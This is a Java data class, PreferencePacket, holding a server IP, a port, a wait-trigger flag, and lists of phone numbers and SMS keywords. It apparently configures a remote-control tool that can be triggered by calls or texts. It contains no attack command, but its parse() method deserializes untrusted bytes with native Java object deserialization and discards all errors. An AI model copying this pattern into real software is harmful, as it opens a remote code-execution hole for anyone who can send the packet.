package Packet;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;

public class PreferencePacket implements Packet, Serializable{

	private static final long serialVersionUID = 4434667156231031L;

	String ip;
	int port;
	boolean waitTrigger;
	ArrayList<String> phoneNumberCall;
	ArrayList<String> phoneNumberSMS;
	ArrayList<String> keywordSMS;
	
	public PreferencePacket() {
		
	}
	
	public PreferencePacket(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		this.ip = ip;
		this.port = port;
		this.waitTrigger = wait;
		this.phoneNumberCall = phones;
		this.phoneNumberSMS = sms;
		this.keywordSMS = kw;
	}
	
	public byte[] build() {
		try {
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ObjectOutputStream out = new ObjectOutputStream(bos);
			out.writeObject(this);
			return bos.toByteArray();
		} catch (IOException e) {
			return null;
		}
	}

	public void parse(byte[] packet) {
		ByteArrayInputStream bis = new ByteArrayInputStream(packet);
		ObjectInputStream in;
		try {
			in = new ObjectInputStream(bis);
			PreferencePacket p = (PreferencePacket) in.readObject();
			setIp(p.getIp());
			setPort(p.getPort());
			setWaitTrigger(p.isWaitTrigger());
			setPhoneNumberCall(p.getPhoneNumberCall());
			setPhoneNumberSMS(p.getPhoneNumberSMS());
			setKeywordSMS(p.getKeywordSMS());
		} catch (Exception e) {
		}
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public boolean isWaitTrigger() {
		return waitTrigger;
	}

	public void setWaitTrigger(boolean waitTrigger) {
		this.waitTrigger = waitTrigger;
	}

	public ArrayList<String> getPhoneNumberCall() {
		return phoneNumberCall;
	}

	public void setPhoneNumberCall(ArrayList<String> phoneNumberCall) {
		this.phoneNumberCall = phoneNumberCall;
	}

	public ArrayList<String> getPhoneNumberSMS() {
		return phoneNumberSMS;
	}

	public void setPhoneNumberSMS(ArrayList<String> phoneNumberSMS) {
		this.phoneNumberSMS = phoneNumberSMS;
	}

	public ArrayList<String> getKeywordSMS() {
		return keywordSMS;
	}

	public void setKeywordSMS(ArrayList<String> keywordSMS) {
		this.keywordSMS = keywordSMS;
	}
}
